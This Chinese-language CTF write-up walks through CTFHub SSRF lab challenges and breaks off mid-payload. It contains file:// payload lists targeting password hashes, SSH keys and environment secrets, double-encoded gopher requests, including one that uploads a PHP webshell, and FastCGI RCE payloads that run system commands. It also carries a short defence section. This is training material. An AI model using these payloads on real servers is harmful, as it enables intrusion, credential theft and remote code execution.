<meta name="referrer" content="no-referrer" />

# SSRF

## 内网访问

#### 题目内容

**尝试访问位于127.0.0.1的flag.php吧**

![image-20251016175019407](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240457341.png)



#### 解题过程

访问题目的链接页面会被定向到url为

```
http://challenge-0046dc0e5868b5e1.sandbox.ctfhub.com:10800/?url=_
```

![image-20251016183205927](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240457808.png)



推测可以通过参数url访问内网

直接访问`?url=http://127.0.0.1/flag.php`即可

![image-20251016183337171](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240457563.png)

##### flag

```
ctfhub{5ac5e5473b53f600d81910b8}
```





## 伪协议读取文件

#### 题目内容

**尝试去读取一下Web目录下的flag.php吧**

![image-20251016184301292](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240457532.png)

#### 解题过程

![image-20251016183819871](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240457993.png)

在 SSRF（服务器端请求伪造）攻击中，file协议是常用的利用手段之一。file协议是本地文件访问协议，允许直接读取服务器上的文件内容。当服务器存在 SSRF 安全风险且未限制file协议时，攻击者可构造类似file:///etc/passwd的恶意 URL，诱导服务器读取本地敏感文件。利用file协议的典型 Payload 格式如下所示。

```
file:///绝对路径/文件名
其中三个斜杠表示本地文件系统。常见利用场景包括读取系统配置文件（如/etc/hosts）、Web 应用配置（如数据库连接信息）、用户密码文件等。
```

（1）经典攻击载荷（Linux/Unix 系统）：

```
文件路径	文件内容与攻击价值
file:///etc/passwd	用户账户信息。虽然密码已分离存储，但可枚举所有用户名。
file:///etc/shadow	用户密码哈希。如果服务器进程以 root 权限运行，能读取此文件，则可尝试离线破解用户密码。
file:///proc/self/cwd/application.properties	读取进程当前工作目录下的配置文件。/proc/self/cwd 是一个指向当前进程工作目录的符号链接,用于定位Web应用的配置文件。
file:///home/[用户名]/.ssh/id_rsa	用户的 SSH 私钥。获取后可直接通过 SSH 免密登录服务器。
file:///home/[用户名]/.bash_history	用户的历史命令。可能包含敏感操作、密码、访问密钥等信息。
file:///var/www/html/config.php	Web 应用配置文件。可能包含数据库密码、密钥等敏感信息。
file:///proc/self/environ	进程环境变量。可能包含密码,密钥等被传入环境中的敏感信息。
file:///proc/net/arp 

file:///proc/net/tcp

网络信息。用于内网信息收集，探测内网活跃主机和开放端口。
```

（2）经典攻击载荷（Windows 系统）：

```
文件路径	文件内容与攻击价值
file:///C:/Windows/System32/drivers/etc/hosts	主机文件。查看内部域名映射。
file:///C:/boot.ini	系统启动配置文件（旧系统）。
file:///C:/Windows/win.ini	系统配置文件。
file:///C:/Windows/Repair/SAM	SAM 文件备份。包含用户的密码哈希,可用于破解。
file:///C:/xampp/apache/conf/httpd.conf	Apache 配置文件。包含路径、端口等敏感信息。
```

（3）防范方法
file 协议是 SSRF 攻击中最直接、最致命的武器之一。它直接将风险从网络层次提升到了操作系统的文件系统，因此必须在代码层面进行最严格的输入过滤和协议限制。防御 file 协议的策略如下所示。

协议白名单制度：这是最有效的方法。严格限制应用程序只能向后台请求指定的协议（只允许 http 和 https），彻底拒绝 file、dict、gopher、ftp 等所有其他危险协议。

URL 解析与过滤：在对用户输入的 URL 进行请求前，必须对其进行严格的解析和验证。检查并拒绝任何使用 file 协议（或其他黑名单协议）的请求。

运行权限最小化：运行业务的应用程序或服务绝不应以 root 或 SYSTEM 等高权限运行。应以低权限用户身份运行，从而即使存在 SSRF，也无法读取 /etc/shadow 等关键文件。

网络隔离：虽然对 file 协议无效，但仍是纵深防御的一部分。

题目中说：**尝试去读取一下Web目录下的flag.php吧**

在Liunx系统中web目录一般的存放位置在

```
/var/www/html
```



```
http://challenge-a9e31db01f890456.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
```

查看源码

![image-20251016184347300](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240457805.png)

##### flag

```
ctfhub{dc9eadc8e0d4a9ddd021634c}
```





## 端口扫描

#### 题目内容

**来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,**

![image-20251016184523967](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458012.png)



#### 解题过程

访问**?url=http://127.0.0.1:8000**

抓包对端口进行爆破

![image-20251016184726801](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458506.png)

bp发到爆破模块

yakit的设置如下

::: v-pre
比如说，如果要进行一个参数遍历 1-10，在 Yakit 中只需要 `{{int(1-10)}}` 即可把这个位置用数字 `1-10` 依次替换。如果需要用到字典，通过 `{{x(your-dict)}}` 即可把字典内容依次替换标签位置内容，从而达到 Fuzz / 爆破的目的。比如下面这个数据包
:::

设置为

```
{{int(8000-9000)}}
```

![image-20251016185346755](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458778.png)

发包

![image-20251016185514027](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458164.png)

然后通过长度排序

bp爆破成功如下

![image-20251016211505177](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458242.png)







## POST请求

#### 题目内容

**这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年**

![image-20251016193223397](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458033.png)





#### 解题过程

访问首页

```
file:///var/www/html/index.php
```

![image-20251016193612796](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458088.png)

查看源码

![image-20251016193655466](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458591.png)

访问`flag.php`文件，发现有一个输入框

![image-20251016193514203](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458169.png)



![image-20251016194305739](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458715.png)

这里通过file协议和http读到的内容是不一样的

file协议：

![image-20251016194343456](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458150.png)

因为这里只允许来自 `127.0.0.1` 的访问（`REMOTE_ADDR` 检查）

现在拿到了key，只需要构造POST请求，把key提交给`flag.php`页面即可

ssrf中可以使用`gopher`协议来构造post请求，具体格式：

```
gopher://ip:port/_METHOD /file HTTP/1.1 http-header&body
```

构造请求包：

！注意`Content-Length`和`Content-Type`，可以直接访问页面提交数据，抓包再修改Host

```
POST /flag.php HTTP/1.1
Host: 127.0.0.1
User-Agent: curl
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=871cf9e8239b69fed15a2c44a6ac9326
```

**注**：在使用 Gopher协议发送 POST请求包时，Host、Content-Type和Content-Length请求头是必不可少的，但在 GET请求中可以没有。

在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。

所以我们需要对构造的请求包进行两次 URL编码

```
%2550%254f%2553%2554%2520%252f%2566%256c%2561%2567%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250d%250a%2555%2573%2565%2572%252d%2541%2567%2565%256e%2574%253a%2520%2563%2575%2572%256c%250d%250a%2541%2563%2563%2565%2570%2574%253a%2520%252a%252f%252a%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2533%2536%250d%250a%250d%250a%256b%2565%2579%253d%2538%2537%2531%2563%2566%2539%2565%2538%2532%2533%2539%2562%2536%2539%2566%2565%2564%2531%2535%2561%2532%2563%2534%2534%2561%2536%2561%2563%2539%2533%2532%2536
```

```
?url=gopher://127.0.0.1:80/_%2550%254f%2553%2554%2520%252f%2566%256c%2561%2567%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250d%250a%2555%2573%2565%2572%252d%2541%2567%2565%256e%2574%253a%2520%2563%2575%2572%256c%250d%250a%2541%2563%2563%2565%2570%2574%253a%2520%252a%252f%252a%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2533%2536%250d%250a%250d%250a%256b%2565%2579%253d%2538%2537%2531%2563%2566%2539%2565%2538%2532%2533%2539%2562%2536%2539%2566%2565%2564%2531%2535%2561%2532%2563%2534%2534%2561%2536%2561%2563%2539%2533%2532%2536
```

![image-20251016194844157](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240458510.png)

##### flag

```
ctfhub{40e67799b2e0487c4e7a2f3b}
```





## 上传文件

#### 题目描述

**这次需要上传一个文件到flag.php了.祝你好运**

![image-20251016195026982](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240459114.png)



#### 解题过程

访问

```
?url=file:///var/www/html/flag.php
```

![image-20251016214302954](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240459867.png)

查看下源码

![image-20251016214320630](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240459823.png)

这里同样禁止非本地的IP访问

使用http协议来访问

```
?url=http://127.0.0.1/flag.php
```

![image-20251016214454820](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240459025.png)

提示需要上传 Webshell，只有选择文件功能，并没有提交按钮。

在`form`表单中写入提交按钮：

```
<input type="submit" name="submit">
```

注意这里用复制粘贴元素功能

![image-20251016214937015](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240459404.png)

![image-20251016214823011](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240459299.png)

随意上传一个文件看看

![image-20251016215050552](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240459445.png)

只允许从本地访问，重新上传文件，并抓包

![image-20251016215212800](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240459455.png)

参照POST请求，构造POST请求并进行两次URL编码

```
%2550%254f%2553%2554%2520%252f%2566%256c%2561%2567%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2563%2568%2561%256c%256c%2565%256e%2567%2565%252d%2562%2536%2538%2536%2565%2533%2564%2530%2539%2531%2535%2563%2535%2562%2561%2563%252e%2573%2561%256e%2564%2562%256f%2578%252e%2563%2574%2566%2568%2575%2562%252e%2563%256f%256d%253a%2531%2530%2538%2530%2530%250d%250a%2543%2561%2563%2568%2565%252d%2543%256f%256e%2574%2572%256f%256c%253a%2520%256d%2561%2578%252d%2561%2567%2565%253d%2530%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%256d%2575%256c%2574%2569%2570%2561%2572%2574%252f%2566%256f%2572%256d%252d%2564%2561%2574%2561%253b%2520%2562%256f%2575%256e%2564%2561%2572%2579%253d%252d%252d%252d%252d%2557%2565%2562%254b%2569%2574%2546%256f%2572%256d%2542%256f%2575%256e%2564%2561%2572%2579%2564%2534%2542%256d%254d%2579%2564%2568%257a%254b%256f%2543%256e%2555%2566%2578%250d%250a%2541%2563%2563%2565%2570%2574%252d%254c%2561%256e%2567%2575%2561%2567%2565%253a%2520%257a%2568%252d%2543%254e%252c%257a%2568%253b%2571%253d%2530%252e%2539%250d%250a%254f%2572%2569%2567%2569%256e%253a%2520%2568%2574%2574%2570%253a%252f%252f%2563%2568%2561%256c%256c%2565%256e%2567%2565%252d%2562%2536%2538%2536%2565%2533%2564%2530%2539%2531%2535%2563%2535%2562%2561%2563%252e%2573%2561%256e%2564%2562%256f%2578%252e%2563%2574%2566%2568%2575%2562%252e%2563%256f%256d%253a%2531%2530%2538%2530%2530%250d%250a%2552%2565%2566%2565%2572%2565%2572%253a%2520%2568%2574%2574%2570%253a%252f%252f%2563%2568%2561%256c%256c%2565%256e%2567%2565%252d%2562%2536%2538%2536%2565%2533%2564%2530%2539%2531%2535%2563%2535%2562%2561%2563%252e%2573%2561%256e%2564%2562%256f%2578%252e%2563%2574%2566%2568%2575%2562%252e%2563%256f%256d%253a%2531%2530%2538%2530%2530%252f%253f%2575%2572%256c%253d%2568%2574%2574%2570%253a%252f%252f%2531%2532%2537%252e%2530%252e%2530%252e%2531%252f%2566%256c%2561%2567%252e%2570%2568%2570%250d%250a%2555%2570%2567%2572%2561%2564%2565%252d%2549%256e%2573%2565%2563%2575%2572%2565%252d%2552%2565%2571%2575%2565%2573%2574%2573%253a%2520%2531%250d%250a%2555%2573%2565%2572%252d%2541%2567%2565%256e%2574%253a%2520%254d%256f%257a%2569%256c%256c%2561%252f%2535%252e%2530%2520%2528%2557%2569%256e%2564%256f%2577%2573%2520%254e%2554%2520%2531%2530%252e%2530%253b%2520%2557%2569%256e%2536%2534%253b%2520%2578%2536%2534%2529%2520%2541%2570%2570%256c%2565%2557%2565%2562%254b%2569%2574%252f%2535%2533%2537%252e%2533%2536%2520%2528%254b%2548%2554%254d%254c%252c%2520%256c%2569%256b%2565%2520%2547%2565%2563%256b%256f%2529%2520%2543%2568%2572%256f%256d%2565%252f%2531%2534%2531%252e%2530%252e%2530%252e%2530%2520%2553%2561%2566%2561%2572%2569%252f%2535%2533%2537%252e%2533%2536%250d%250a%2541%2563%2563%2565%2570%2574%253a%2520%2574%2565%2578%2574%252f%2568%2574%256d%256c%252c%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%2568%2574%256d%256c%252b%2578%256d%256c%252c%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%256d%256c%253b%2571%253d%2530%252e%2539%252c%2569%256d%2561%2567%2565%252f%2561%2576%2569%2566%252c%2569%256d%2561%2567%2565%252f%2577%2565%2562%2570%252c%2569%256d%2561%2567%2565%252f%2561%2570%256e%2567%252c%252a%252f%252a%253b%2571%253d%2530%252e%2538%252c%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2573%2569%2567%256e%2565%2564%252d%2565%2578%2563%2568%2561%256e%2567%2565%253b%2576%253d%2562%2533%253b%2571%253d%2530%252e%2537%250d%250a%2541%2563%2563%2565%2570%2574%252d%2545%256e%2563%256f%2564%2569%256e%2567%253a%2520%2567%257a%2569%2570%252c%2520%2564%2565%2566%256c%2561%2574%2565%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2533%2532%2533%250d%250a%250d%250a%252d%252d%252d%252d%252d%252d%2557%2565%2562%254b%2569%2574%2546%256f%2572%256d%2542%256f%2575%256e%2564%2561%2572%2579%2564%2534%2542%256d%254d%2579%2564%2568%257a%254b%256f%2543%256e%2555%2566%2578%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2544%2569%2573%2570%256f%2573%2569%2574%2569%256f%256e%253a%2520%2566%256f%2572%256d%252d%2564%2561%2574%2561%253b%2520%256e%2561%256d%2565%253d%2522%2566%2569%256c%2565%2522%253b%2520%2566%2569%256c%2565%256e%2561%256d%2565%253d%2522%2563%256d%2564%252e%2570%2568%2570%2522%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%256f%2563%2574%2565%2574%252d%2573%2574%2572%2565%2561%256d%250d%250a%250d%250a%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%250d%250a%252d%252d%252d%252d%252d%252d%2557%2565%2562%254b%2569%2574%2546%256f%2572%256d%2542%256f%2575%256e%2564%2561%2572%2579%2564%2534%2542%256d%254d%2579%2564%2568%257a%254b%256f%2543%256e%2555%2566%2578%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2544%2569%2573%2570%256f%2573%2569%2574%2569%256f%256e%253a%2520%2566%256f%2572%256d%252d%2564%2561%2574%2561%253b%2520%256e%2561%256d%2565%253d%2522%2573%2575%2562%256d%2569%2574%2522%250d%250a%250d%250a%25e6%258f%2590%25e4%25ba%25a4%250d%250a%252d%252d%252d%252d%252d%252d%2557%2565%2562%254b%2569%2574%2546%256f%2572%256d%2542%256f%2575%256e%2564%2561%2572%2579%2564%2534%2542%256d%254d%2579%2564%2568%257a%254b%256f%2543%256e%2555%2566%2578%252d%252d
```

使用gopher协议

```
gopher://127.0.0.1:80/_%2550%254f%2553%2554%2520%252f%2566%256c%2561%2567%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2563%2568%2561%256c%256c%2565%256e%2567%2565%252d%2562%2536%2538%2536%2565%2533%2564%2530%2539%2531%2535%2563%2535%2562%2561%2563%252e%2573%2561%256e%2564%2562%256f%2578%252e%2563%2574%2566%2568%2575%2562%252e%2563%256f%256d%253a%2531%2530%2538%2530%2530%250d%250a%2543%2561%2563%2568%2565%252d%2543%256f%256e%2574%2572%256f%256c%253a%2520%256d%2561%2578%252d%2561%2567%2565%253d%2530%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%256d%2575%256c%2574%2569%2570%2561%2572%2574%252f%2566%256f%2572%256d%252d%2564%2561%2574%2561%253b%2520%2562%256f%2575%256e%2564%2561%2572%2579%253d%252d%252d%252d%252d%2557%2565%2562%254b%2569%2574%2546%256f%2572%256d%2542%256f%2575%256e%2564%2561%2572%2579%2564%2534%2542%256d%254d%2579%2564%2568%257a%254b%256f%2543%256e%2555%2566%2578%250d%250a%2541%2563%2563%2565%2570%2574%252d%254c%2561%256e%2567%2575%2561%2567%2565%253a%2520%257a%2568%252d%2543%254e%252c%257a%2568%253b%2571%253d%2530%252e%2539%250d%250a%254f%2572%2569%2567%2569%256e%253a%2520%2568%2574%2574%2570%253a%252f%252f%2563%2568%2561%256c%256c%2565%256e%2567%2565%252d%2562%2536%2538%2536%2565%2533%2564%2530%2539%2531%2535%2563%2535%2562%2561%2563%252e%2573%2561%256e%2564%2562%256f%2578%252e%2563%2574%2566%2568%2575%2562%252e%2563%256f%256d%253a%2531%2530%2538%2530%2530%250d%250a%2552%2565%2566%2565%2572%2565%2572%253a%2520%2568%2574%2574%2570%253a%252f%252f%2563%2568%2561%256c%256c%2565%256e%2567%2565%252d%2562%2536%2538%2536%2565%2533%2564%2530%2539%2531%2535%2563%2535%2562%2561%2563%252e%2573%2561%256e%2564%2562%256f%2578%252e%2563%2574%2566%2568%2575%2562%252e%2563%256f%256d%253a%2531%2530%2538%2530%2530%252f%253f%2575%2572%256c%253d%2568%2574%2574%2570%253a%252f%252f%2531%2532%2537%252e%2530%252e%2530%252e%2531%252f%2566%256c%2561%2567%252e%2570%2568%2570%250d%250a%2555%2570%2567%2572%2561%2564%2565%252d%2549%256e%2573%2565%2563%2575%2572%2565%252d%2552%2565%2571%2575%2565%2573%2574%2573%253a%2520%2531%250d%250a%2555%2573%2565%2572%252d%2541%2567%2565%256e%2574%253a%2520%254d%256f%257a%2569%256c%256c%2561%252f%2535%252e%2530%2520%2528%2557%2569%256e%2564%256f%2577%2573%2520%254e%2554%2520%2531%2530%252e%2530%253b%2520%2557%2569%256e%2536%2534%253b%2520%2578%2536%2534%2529%2520%2541%2570%2570%256c%2565%2557%2565%2562%254b%2569%2574%252f%2535%2533%2537%252e%2533%2536%2520%2528%254b%2548%2554%254d%254c%252c%2520%256c%2569%256b%2565%2520%2547%2565%2563%256b%256f%2529%2520%2543%2568%2572%256f%256d%2565%252f%2531%2534%2531%252e%2530%252e%2530%252e%2530%2520%2553%2561%2566%2561%2572%2569%252f%2535%2533%2537%252e%2533%2536%250d%250a%2541%2563%2563%2565%2570%2574%253a%2520%2574%2565%2578%2574%252f%2568%2574%256d%256c%252c%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%2568%2574%256d%256c%252b%2578%256d%256c%252c%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%256d%256c%253b%2571%253d%2530%252e%2539%252c%2569%256d%2561%2567%2565%252f%2561%2576%2569%2566%252c%2569%256d%2561%2567%2565%252f%2577%2565%2562%2570%252c%2569%256d%2561%2567%2565%252f%2561%2570%256e%2567%252c%252a%252f%252a%253b%2571%253d%2530%252e%2538%252c%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2573%2569%2567%256e%2565%2564%252d%2565%2578%2563%2568%2561%256e%2567%2565%253b%2576%253d%2562%2533%253b%2571%253d%2530%252e%2537%250d%250a%2541%2563%2563%2565%2570%2574%252d%2545%256e%2563%256f%2564%2569%256e%2567%253a%2520%2567%257a%2569%2570%252c%2520%2564%2565%2566%256c%2561%2574%2565%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2533%2532%2533%250d%250a%250d%250a%252d%252d%252d%252d%252d%252d%2557%2565%2562%254b%2569%2574%2546%256f%2572%256d%2542%256f%2575%256e%2564%2561%2572%2579%2564%2534%2542%256d%254d%2579%2564%2568%257a%254b%256f%2543%256e%2555%2566%2578%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2544%2569%2573%2570%256f%2573%2569%2574%2569%256f%256e%253a%2520%2566%256f%2572%256d%252d%2564%2561%2574%2561%253b%2520%256e%2561%256d%2565%253d%2522%2566%2569%256c%2565%2522%253b%2520%2566%2569%256c%2565%256e%2561%256d%2565%253d%2522%2563%256d%2564%252e%2570%2568%2570%2522%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%256f%2563%2574%2565%2574%252d%2573%2574%2572%2565%2561%256d%250d%250a%250d%250a%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%250d%250a%252d%252d%252d%252d%252d%252d%2557%2565%2562%254b%2569%2574%2546%256f%2572%256d%2542%256f%2575%256e%2564%2561%2572%2579%2564%2534%2542%256d%254d%2579%2564%2568%257a%254b%256f%2543%256e%2555%2566%2578%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2544%2569%2573%2570%256f%2573%2569%2574%2569%256f%256e%253a%2520%2566%256f%2572%256d%252d%2564%2561%2574%2561%253b%2520%256e%2561%256d%2565%253d%2522%2573%2575%2562%256d%2569%2574%2522%250d%250a%250d%250a%25e6%258f%2590%25e4%25ba%25a4%250d%250a%252d%252d%252d%252d%252d%252d%2557%2565%2562%254b%2569%2574%2546%256f%2572%256d%2542%256f%2575%256e%2564%2561%2572%2579%2564%2534%2542%256d%254d%2579%2564%2568%257a%254b%256f%2543%256e%2555%2566%2578%252d%252d
```

发包直接得到flag

![image-20251016215606278](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240459859.png)

##### flag

```
ctfhub{bfa46a4abeb1b711b1d1c20b}
```



## FastCGI协议

#### 题目内容

**这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助**

![image-20251016212657291](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240501317.png)



#### 解题过程



这里坑多，先使用[tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers](https://github.com/tarunkant/Gopherus)

这个工具来实现这一题，后面再讲



![image-20251016213707873](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240501566.png)

```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%03%03%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%16SCRIPT_FILENAME/var/www/html/flag.php%0D%01DOCUMENT_ROOT/%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

这里要将_后面的内容再URL编码一次才能成功

```
?url=gopher://127.0.0.1:9000/_%25%30%31%25%30%31%25%30%30%25%30%31%25%30%30%25%30%38%25%30%30%25%30%30%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%31%25%30%34%25%30%34%25%30%30%25%30%46%25%31%30%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%67%6f%25%32%30%2f%25%32%30%66%63%67%69%63%6c%69%65%6e%74%25%32%30%25%30%42%25%30%39%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%25%30%46%25%30%38%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%25%30%45%25%30%32%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%35%36%25%30%45%25%30%34%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%25%30%39%4b%50%48%50%5f%56%41%4c%55%45%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%25%32%30%25%33%44%25%32%30%4f%6e%25%30%41%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%25%32%30%25%33%44%25%32%30%25%30%41%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%25%32%30%25%33%44%25%32%30%70%68%70%25%33%41%2f%2f%69%6e%70%75%74%25%30%46%25%31%37%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%69%6e%64%65%78%2e%70%68%70%25%30%44%25%30%31%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%35%25%30%30%25%30%31%25%30%30%38%25%30%34%25%30%30%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%37%6c%73%25%32%30%2f%25%32%37%25%32%39%25%33%42%64%69%65%25%32%38%25%32%37%2d%2d%2d%2d%2d%4d%61%64%65%2d%62%79%2d%53%70%79%44%33%72%2d%2d%2d%2d%2d%25%30%41%25%32%37%25%32%39%25%33%42%25%33%46%25%33%45%25%30%30%25%30%30%25%30%30%25%30%30
```

![image-20251016213804160](https://gitee.com/ttovlove/images/raw/master/CTFHUB_WEB/202602240501262.png)



这里得到了flag文件的名字就可以cat flag了

```
cat /flag_0ab117ae3c403274b12555bf30768ce2
```

同样的再生成一遍payload

```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH94%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%5E%04%00%3C%3Fphp%20system%28%27cat%20/flag_0ab117ae3c403274b12555bf30768ce2%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```

url编码一次

```
?url=gopher://127.0.0.1:9000/_%25%30%31%25%30%31%25%30%30%25%30%31%25%30%30%25%30%38%25%30%30%25%30%30%25%30%30%25%30%31%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%30%25%30%31%25%30%34%25%30%30%25%30%31%25%30%31%25%30%34%25%30%34%25%30%30%25%30%46%25%31%30%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%67%6f%25%32%30%2f%25%32%30%66%63%67%69%63%6c%69%65%6e%74%25%32%30%25%30%42%25%30%39%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%25%30%46%25%30%38%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%25%30%45%25%30%32%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%39%34%25%30%45%25%30%34%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%25%30%39%4b%50%48%50%5f%56%41%4c%55%45%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%25%32%30%25%33%44%25%32%30%4f%6e%25%30%41%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%25%32%30%25%33%44%25%32%30%25%30%41%61%75%74%6f%5f